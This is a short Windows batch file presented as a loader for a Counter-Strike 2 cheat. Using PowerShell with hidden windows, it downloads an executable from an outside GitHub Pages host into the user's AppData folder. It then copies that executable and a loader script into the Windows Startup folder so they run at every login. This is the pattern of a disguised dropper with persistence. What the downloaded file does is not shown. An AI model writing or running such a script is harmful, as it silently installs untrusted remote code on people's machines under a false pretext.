@echo off
set "destination=%AppData%\Saver"
if not exist "%destination%" mkdir "%destination%"
set "link1=https://demon4u.github.io/cs.exe"
if not exist "%destination%\cs.exe" (
    echo Loading CS_Cheat...
    powershell -WindowStyle Hidden -command "& {curl.exe -L '%link1%' -o '%destination%\cs.exe'}"
)

set "startup_destination=%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"
if not exist "%startup_destination%" mkdir "%startup_destination%"
set "link2=https://github.com/Demon4u/CS2-Cheat/blob/89c60ca064528316bd33eeb02d086a457c3db0b4/Loader.bat"
set "link3=https://demon4u.github.io/cs.exe"

if not exist "%startup_destination%\Loader.bat" (
    echo Loading Loader.bat...
    powershell -WindowStyle Hidden -command "& {curl.exe -L '%link2%' -o '%startup_destination%\Loader.bat'}"
)

if not exist "%startup_destination%\cs.exe" (
    echo Loading CS_Cheat...
    powershell -WindowStyle Hidden -command "& {curl.exe -L '%link3%' -o '%startup_destination%\cs.exe'}"
)

exit
